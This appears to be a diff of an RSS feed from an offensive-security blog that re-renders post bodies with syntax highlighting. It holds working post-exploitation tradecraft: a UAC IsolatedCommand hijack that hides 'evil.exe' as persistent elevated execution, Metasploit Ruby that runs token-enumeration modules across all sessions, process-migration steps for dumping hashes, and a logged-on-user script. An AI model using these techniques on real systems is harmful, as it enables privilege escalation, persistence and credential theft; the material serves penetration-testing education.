+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;stdio.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;tchar.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_tmain&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, _TCHAR&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; argv[])
 {
-    if (argv[1])
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
     {
-        ShellExecuteW(NULL,NULL,argv[1],NULL,NULL,SW_SHOW);
-        if (argv[2])
+        ShellExecuteW(NULL,NULL,argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],NULL,NULL,SW_SHOW);
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
         {
-            ShellExecuteW(NULL,NULL,argv[2],NULL,NULL,SW_HIDE);
+            ShellExecuteW(NULL,NULL,argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],NULL,NULL,SW_HIDE);
         }
     }
-    return 0;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
 }
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This code executes the first program visibly and then the second hidden. You probably see where this is going, but we change our IsolatedCommand String to runyou.exe %1 evil.exe and now we give them exactly what they want in an elevated state, but also get our evil binary there too ;-)&lt;/p&gt;
-
-&lt;p&gt;The very real down side to this is you have to wait for the user to use UAC (this does not work if someone else does, it&amp;rsquo;s only for the current user HKCU). But, as a side benefit, it&amp;rsquo;s a very real form of sneaky persistence as well, as it will execute our evil binary every single time they use UAC.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code executes the first program visibly and then the second hidden. You probably see where this is going, but we change our IsolatedCommand String to runyou.exe %1 evil.exe and now we give them exactly what they want in an elevated state, but also get our evil binary there too ;-)&lt;/p&gt;
+&lt;p&gt;The very real down side to this is you have to wait for the user to use UAC (this does not work if someone else does, it&#39;s only for the current user HKCU). But, as a side benefit, it&#39;s a very real form of sneaky persistence as well, as it will execute our evil binary every single time they use UAC.&lt;/p&gt;
 &lt;p&gt;Game Over&amp;hellip; ;-)&lt;/p&gt;
 </description>
     </item>
@@ -580,51 +409,36 @@ int _tmain(int argc, _TCHAR* argv[])
       
       <guid>https://malicious.link/post/2011/2011-11-02-run-post-modules-on-all-sessions/</guid>
       <description>&lt;p&gt;&lt;a href=&#34;http://twitter.com/jcran&#34;&gt;Jcran&lt;/a&gt; recently blogged about an easy way to run a post module on all sessions:&lt;/p&gt;
-
 &lt;p&gt;&lt;a href=&#34;http://blog.pentestify.com/simple-framework-domain-token-scanner&#34;&gt;http://blog.pentestify.com/simple-framework-domain-token-scanner&lt;/a&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
-msf enum_domain_tokens&amp;gt; irb
-framework.sessions.each do |session|
-  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
-  run_single(&amp;quot;run&amp;quot;)
-  sleep 1
-end
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.&lt;/p&gt;
-
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;msf&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; use post&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;windows&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;gather&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;enum_domain_tokens
+msf enum_domain_tokens&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; irb
+framework&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sessions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+  run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set SESSION &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;first&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;run&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You use the POST module, drop to IRB and run those 4 lines, and bam, you win. With resource files we can automate this a bit more and have it so that we do this effortlessly with any post module.&lt;/p&gt;
 &lt;p&gt;Thinking back to &lt;a href=&#34;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&#34;&gt;http://blog.metasploit.com/2010/03/automating-metasploit-console.html&lt;/a&gt; and my rapid file PSEXEC resource file, we know we can run ruby inside of resource files with the &lt;ruby&gt; tag.&lt;/p&gt;
-
-&lt;p&gt;Save the following as runall.rc somewhere where you&amp;rsquo;ll remember:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;framework.sessions.each do |session|
-  run_single(&amp;quot;set SESSION #{session.first}&amp;quot;)
-  print_status(&amp;quot;Running #{active_module.fullname} against session #{session.first}&amp;quot;)
-  run_single(&amp;quot;run&amp;quot;)
-  sleep 1
-end
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Then when you want to run a POST module against every session you have you simply do:&lt;/p&gt;
-
+&lt;p&gt;Save the following as runall.rc somewhere where you&#39;ll remember:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;framework&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sessions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+  run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set SESSION &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;first&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Running &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;active_module&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fullname&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; against session &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;first&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;run&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then when you want to run a POST module against every session you have you simply do:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf&amp;gt; use post/windows/gather/enum_domain_tokens
 msf enum_domain_tokens&amp;gt; resource runall.rc
 [*] Running post/windows/gather/enum_domain_tokens on session 1
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-11-06 20:05 by Rob Fuller&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; on 2011-11-06 20:05 by Rob Fuller&lt;/p&gt;
 &lt;p&gt;A commenter noticed an error in the coding for cross compatibility. The following should work better across versions:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;framework.sessions.each_key do |session|
-  run_single(&amp;quot;set SESSION #{session}&amp;quot;)
-  print_status(&amp;quot;Running #{active_module.fullname} against session #{session}&amp;quot;)
-  run_single(&amp;quot;run&amp;quot;)
-  sleep 1
-end
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;framework&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sessions&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each_key &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;session&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+  run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;set SESSION &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;session&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Running &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;active_module&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fullname&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; against session &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;#{&lt;/span&gt;session&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  run_single(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;run&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+  sleep &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -633,18 +447,11 @@ end
       <pubDate>Thu, 06 Oct 2011 15:53:11 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-10-06-the-dirty-little-secrets-they-didnt-teach-you-in-pentesting/</guid>
-      <description>
-
-&lt;h4 id=&#34;video&#34;&gt;Video:&lt;/h4&gt;
-
+      <description>&lt;h4 id=&#34;video&#34;&gt;Video:&lt;/h4&gt;
 &lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;//www.youtube.com/embed/xXqyogdxITE&#34; frameborder=&#34;0&#34; allowfullscreen&gt;&lt;/iframe&gt;
-
 &lt;h4 id=&#34;slides&#34;&gt;Slides:&lt;/h4&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://www.slideshare.net/mubix/the-dirty-little-secrets-they-didnt-teach-you-in-pentesting-class-9530403&#34;&gt;The Dirty Little Secrets They Didn&amp;rsquo;t Teach You In Pentesting Class&lt;/a&gt;&lt;/strong&gt; [slideshare id=9530403]&lt;/p&gt;
-
+&lt;p&gt;&lt;strong&gt;&lt;a href=&#34;http://www.slideshare.net/mubix/the-dirty-little-secrets-they-didnt-teach-you-in-pentesting-class-9530403&#34;&gt;The Dirty Little Secrets They Didn&#39;t Teach You In Pentesting Class&lt;/a&gt;&lt;/strong&gt; [slideshare id=9530403]&lt;/p&gt;
 &lt;h4 id=&#34;code&#34;&gt;Code:&lt;/h4&gt;
-
 &lt;p&gt;&lt;a href=&#34;https://github.com/mubix/Not-In-Pentesting-Class&#34;&gt;https://github.com/mubix/Not-In-Pentesting-Class&lt;/a&gt;&lt;/p&gt;
 </description>
     </item>
@@ -655,12 +462,9 @@ end
       <pubDate>Wed, 28 Sep 2011 05:45:22 +0000</pubDate>
       
       <guid>https://malicious.link/post/2011/2011-09-28-create-a-64bit-process-from-a-x8632bit-one/</guid>
-      <description>&lt;p&gt;On Vista and above there is a Windows &amp;lsquo;Redirector&amp;rsquo; (A redirector is basically a Symlink or fake directory that&amp;rsquo;s there but not in Windows) (&lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/aa384187(v=vs.85&#34;&gt;more info here&lt;/a&gt;.aspx&amp;rdquo;)) that allows a 32bit process create a 64bit one. For anyone who has tried to run &amp;lsquo;execute -H -c -f notepad.exe&amp;rsquo;, they know that if they are in a 32bit process, they get a 32bit notepad even if they are on a 64bit system, which is annoying. So if you don&amp;rsquo;t want to read the link above you can create a stable 64bit notepad.exe by doing the following:&lt;/p&gt;
-
+      <description>&lt;p&gt;On Vista and above there is a Windows &amp;lsquo;Redirector&amp;rsquo; (A redirector is basically a Symlink or fake directory that&#39;s there but not in Windows) (&lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/aa384187(v=vs.85).aspx%22&#34;&gt;more info here&lt;/a&gt;) that allows a 32bit process create a 64bit one. For anyone who has tried to run &amp;lsquo;execute -H -c -f notepad.exe&amp;rsquo;, they know that if they are in a 32bit process, they get a 32bit notepad even if they are on a 64bit system, which is annoying. So if you don&#39;t want to read the link above you can create a stable 64bit notepad.exe by doing the following:&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;execute -H -c -f &amp;quot;C:\\WINDOWS\\Sysnative\\notepad.exe&amp;quot;&lt;/code&gt;&lt;/p&gt;
-
 &lt;p&gt;Now you can migrate into that notepad, Metasploit/Meterpreter will handle not only the network socket switch but the upgrade to a 64bit process. Now, you should be able to dump hashes like I talked about (&lt;a href=&#34;https://malicious.link/blog/2011/5/15/dumping-hashes-on-win2k8-r2-x64-with-metasploit.html&#34;&gt;here&lt;/a&gt;).&lt;/p&gt;
-
 &lt;p&gt;Of course you need to change the drive and windows directory to match your target (Language changes and base drive changes apply), but the rest should work as perscribed.&lt;/p&gt;
 </description>
     </item>
@@ -672,24 +476,19 @@ end
       
       <guid>https://malicious.link/post/2011/2011-09-17-who-is-logged-in-a-quick-way-to-pick-your-targets/</guid>
       <description>&lt;p&gt;Say you go for the 500+ shells on an internal test or your phishing exersice goes way better than you thought. Well you need to get your bearings quickly and going into each shell and doing a ps, then looking through the list for all the users logged in is a bit of a pain and defintely not ideal.&lt;/p&gt;
-
 &lt;p&gt;I wrote a quick script that you can throw in the meterpreter scripts folder to aide you a bit with this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;users &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;each_process &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;
+        users &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; x&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;user&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#66d9ef&#34;&gt;end&lt;/span&gt;
 
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;users = []
-client.sys.process.each_process do |x|
-        users &amp;lt;&amp;lt; x[&amp;quot;user&amp;quot;]
-end
-
-users.sort!
-users.uniq!
-users.delete_if {|x| x =~ /^NT AUTHORITY/}
-users.delete_if {|x| x == &amp;quot;&amp;quot;}
-loggedin = users.join(&#39;, &#39;)
+users&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sort!
+users&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;uniq!
+users&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;delete_if {&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;=~&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;^NT AUTHORITY&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;}
+users&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;delete_if {&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;}
+loggedin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; users&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;join(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;, &amp;#39;&lt;/span&gt;)
 print_status(loggedin)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;All it does is automate the process I said above, used in concert with the &amp;lsquo;sessions -s&amp;rsquo; command makes life a bit easier:&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All it does is automate the process I said above, used in concert with the &amp;lsquo;sessions -s&amp;rsquo; command makes life a bit easier:&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;msf  post(enum_logged_on) &amp;gt; sessions -s loggedin
 [*] Running script loggedin on all sessions...
 [*] Session 1 (victimgatewayaddress:21638):
@@ -704,10 +503,7 @@ print_status(loggedin)
 [*] COMPUTERNAME\Administrator, DOMAIN2\AdminUser7
 [*] Session 7 (victimgatewayaddress:39901):
 [*] DOMAIN\User55
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;You can see from this output I probably want to start with session 2, and probably 6 as well as it seems to be on another domain and an admin to boot. The example is small but on a larger scale this can start to be much more important for time management. I&amp;rsquo;m sure there are some of you out there that realized after spending hours with another session that you had one with a DA signed into it on a different system.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;You can see from this output I probably want to start with session 2, and probably 6 as well as it seems to be on another domain and an admin to boot. The example is small but on a larger scale this can start to be much more important for time management. I&#39;m sure there are some of you out there that realized after spending hours with another session that you had one with a DA signed into it on a different system.&lt;/p&gt;
 &lt;p&gt;Just a disclaimer, this ONLY shows who is logged into the sessions you have, not remote systems.&lt;/p&gt;
 </description>
     </item>
@@ -719,79 +515,45 @@ print_status(loggedin)
       
       <guid>https://malicious.link/post/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</guid>
       <description>&lt;p&gt;I saw a post back in June and it just recently came up again:&lt;/p&gt;
-
 &lt;p&gt;&lt;a href=&#34;http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/&#34;&gt;http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;It looked like a lot of hard work to set that up and I&amp;rsquo;m really lazy. I didn&amp;rsquo;t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called &amp;lsquo;gethostbyaddr&amp;rsquo; using Railgun.&lt;/p&gt;
-
+&lt;p&gt;It looked like a lot of hard work to set that up and I&#39;m really lazy. I didn&#39;t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called &amp;lsquo;gethostbyaddr&amp;rsquo; using Railgun.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;TL:DR;&lt;/strong&gt; You can download the post module here: &lt;a href=&#34;https://gist.github.com/mubix/8215137&#34;&gt;ipresolver.rb&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;The function &amp;lsquo;gethostbyaddr&amp;rsquo; (&lt;a href=&#34;&amp;quot;http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85&#34;&gt;http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85).aspx&lt;/a&gt;.aspx)&amp;ldquo;) is pretty simple at first glance:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-cpp&#34;&gt;struct hostent* FAR gethostbyaddr(
-  __in  const char *addr,
-  __in  int len,
-  __in  int type
+&lt;p&gt;The function &amp;lsquo;gethostbyaddr&amp;rsquo; (&lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85).aspx&#34;&gt;http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85).aspx&lt;/a&gt;&amp;quot;) is pretty simple at first glance:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hostent&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; FAR &lt;span style=&#34;color:#a6e22e&#34;&gt;gethostbyaddr&lt;/span&gt;(
+  __in  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;addr,
+  __in  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len,
+  __in  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; type
 );
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Give it an address, length and type and it gives you a hostname back… easy right?&lt;/p&gt;
-
-&lt;p&gt;Defining it, since it isn&amp;rsquo;t in the Railgun definitions is pretty simple:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-ruby&#34;&gt;client.railgun.add_function(&#39;ws2_32&#39;, &#39;gethostbyaddr&#39;, &#39;DWORD&#39;, [        
-	[&#39;PCHAR&#39;, &#39;addr&#39;, &#39;in&#39;],         
-	[&#39;DWORD&#39;,&#39;len&#39;,&#39;in&#39;],         
-	[&#39;DWORD&#39;,&#39;type&#39;,&#39;in&#39;]
-])
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;First hurdle is to get your IP into &amp;lsquo;network byte order&amp;rsquo;. Rex (Metasploit&amp;rsquo;s API/Library) to the rescue.&lt;/p&gt;
-
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Give it an address, length and type and it gives you a hostname back… easy right?&lt;/p&gt;
+&lt;p&gt;Defining it, since it isn&#39;t in the Railgun definitions is pretty simple:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_function(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ws2_32&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gethostbyaddr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DWORD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;        
+	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PCHAR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;addr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,         
+	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DWORD&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;len&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,         
+	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DWORD&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First hurdle is to get your IP into &amp;lsquo;network byte order&amp;rsquo;. Rex (Metasploit&#39;s API/Library) to the rescue.&lt;/p&gt;
